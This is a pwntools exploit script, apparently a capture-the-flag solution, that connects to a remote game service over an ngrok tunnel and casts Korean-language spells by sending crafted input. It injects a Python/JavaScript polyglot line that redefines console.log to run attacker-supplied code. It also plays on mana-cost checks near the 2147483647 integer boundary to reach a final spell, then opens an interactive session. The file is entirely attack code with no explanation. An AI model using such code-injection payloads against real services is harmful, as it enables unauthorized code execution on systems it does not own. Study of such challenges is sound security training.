from pwn import *

SPELL = {
'1' : '모든 힘의 근원이여 붉게 타오르는 빛나는 불꽃이여 내 손 안에 들어와 힘이 되어라', 
'2' : '뇌정이여, 자정의 충격으로, 쓰러뜨려라', 
'3' : '그대가 원하는 곳에 위대한 얼음의 가호가 있을지니 빙하의 탁류를 받아라',
'4' : '달려라 바람, 질주하라, 때려눕혀라', 
'5' : '빛을 품은 이 힘, 불가시를 내 앞으로 인도해 혼돈으로부터 접촉하고자 한다. 전격이여, 꿰뚫어라!',
'6' : '그것은 처음의 불꽃. 그것은 끝의 불꽃. 현재, 과거, 미래-만상을 뛰어넘는 금단의 힘. 불꽃이여, 나는 파괴자, 무자비한 이. 나의 피, 나의 살을 가지고, 옛 신들의 계율을 지금 깨노라!'
}

money=100000
ManaCost = [['1', '20', '100', '5000', '50000', '2147483647'], ['10', '30', '1000', '10000', '200000', '2147483648']]

def attack(idx, double) :
    global SPELL, money, ManaCost

    spell=SPELL[str(idx)].encode()

    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b'>> ', str(idx).encode())
    if(double) :
        #magic='''1//[console:=dict(log=lambda x:print(x)), 1][-1]\nconsole['log']("'''+SPELL[idx]+'''")\nend'''
        r.sendlineafter(b'>> ', b'y')
        r.sendline(b'1//[console:=dict(log=lambda x:print(x)), 1][-1]')
        r.sendline(b'''console['log']("'''+spell+b'")')
        r.sendline(b'end')
    else : 
        if money >= int(ManaCost[1][idx-1]) :
            r.sendlineafter(b'>> ', b'n')
        r.sendline(b'''print("'''+spell+b'")')
        r.sendline(b'end')
    money-=int(ManaCost[double][idx-1])

r=remote('0.tcp.jp.ngrok.io', 10392)

attack(5, 0)
print('1')
sleep(1.5)
attack(4, 1)
print('1')
sleep(1.5)
attack(4, 0)
print('1')
sleep(1.5)
attack(3, 1)
print('1')
sleep(1.5)
attack(3, 1)
print('1')
sleep(1.5)
attack(3, 0)
print('1')
sleep(1.5)
attack(3, 0)
print('1')
sleep(1.5)
attack(2, 0)
print('1')
sleep(1.5)
attack(1, 1)
print('1')
sleep(1.5)
attack(1, 0)
print('1')
sleep(1.5)
attack(1, 0)

#mp**2
r.sendlineafter(b'>> ', b'1')
r.sendlineafter(b'>> ', b'1')

#mp*2
r.sendlineafter(b'>> ', b'1')
r.sendlineafter(b'>> ', b'2')

attack(6, 1)

r.interactive()